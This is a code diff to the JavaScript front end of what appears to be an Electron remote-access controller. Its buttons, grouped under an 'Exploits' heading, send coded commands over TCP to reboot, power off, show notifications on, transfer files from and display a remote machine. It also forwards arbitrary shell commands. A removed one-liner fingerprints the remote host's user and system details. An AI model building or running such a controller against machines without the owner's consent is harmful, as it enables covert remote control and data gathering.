@@ -35,6 +35,7 @@ const scriptsIndex = document.getElementById('scriptsIndex');
  */
 const rebootButton = document.getElementById('rebootButton');
 const poweroffButton = document.getElementById('poweroffButton');
+const showdisplayButton = document.getElementById('showdisplayButton');
 
 const notifysendButton = document.getElementById('notifysendButton');
 const notifysendInput = document.getElementById('notifysendInput')
@@ -147,10 +148,7 @@ function updateInfo() {
      * lb{0x0001}
      * - Custom code to identify infoExploit
      */
-    await window.electron.sendMessage(String.raw`
-echo -e "lb{0x0001}ù$(whoami)ù$(hostnamectl | grep "Operating" | cut -d ':' -f2)ù$(uname -s) $(uname -r)ù$(lscpu | grep "Model name" | cut -f 2 -d ":" | sed 's/^[ \t]*//')ù$(free -m | awk '/^Mem:/{print $2}')ù$(free -m | awk '/^Mem:/{print $3}')ù$(uptime -p)
-"
-      `);
+    await window.electron.sendMessage('lb{0x0001}\n');
   })()
 
 }
@@ -159,7 +157,7 @@ echo -e "lb{0x0001}ù$(whoami)ù$(hostnamectl | grep "Operating" | cut -d ':' -f
  * Exploits
  */
 rebootButton.addEventListener('click', () => {
-  window.electron.sendMessage('lb{0x0002}');
+  window.electron.sendMessage('lb{0x0002}\n');
 })
 poweroffButton.addEventListener('click', () => {
   window.electron.sendMessage('lb{0x0003}');
@@ -168,7 +166,10 @@ getfileButton.addEventListener('click', () => {
   window.electron.requestFileTransfer(sourceInput.value, destinationInput.value);
 })
 notifysendButton.addEventListener('click', () => {
-  window.electron.sendMessage('lb{0x0004} ' + notifysendInput.value);
+  window.electron.sendMessage('lb{0x0004} ' + notifysendInput.value + "\n");
+})
+showdisplayButton.addEventListener('click', () => {
+  window.electron.sendMessage('lb{0x0007}\n');
 })
 
 window.electron.onConnectionStatus((status) => {
@@ -193,22 +194,22 @@ closeButton.addEventListener("click", () => {
 sendButton.addEventListener("click", () => {
   const message = messageInput.value;
   if (message.trim()) {
-    window.electron.sendMessage(message + " 2>&1");
+    window.electron.sendMessage(message + " 2>&1\n");
     messageInput.value = "";
   }
 });
 
 window.electron.onTcpMessage((message) => {
   if (message.includes("lb{0x0001}")) {
-
-    let information = message.split('ù');
-    user = information[1]
-    os = information[2]
-    kernel = information[3]
-    cpu = information[4]
-    mem_u = information[5]
-    mem_t = information[6]
-    uptime = information[7]
+    console.log(message.split('|')[1]);
+    let information = message.split('|');
+    user = information[1]   || "idk";
+    os = information[2]     || "idk";
+    kernel = information[3] || "idk";
+    cpu = information[4]    || "idk";
+    mem_u = information[5]  || "idk";
+    mem_t = information[6]  || "idk";
+    uptime = information[7] || "idk";
   } else {
     messagesDiv.innerHTML = "";
     const messageElement = document.createElement("div");
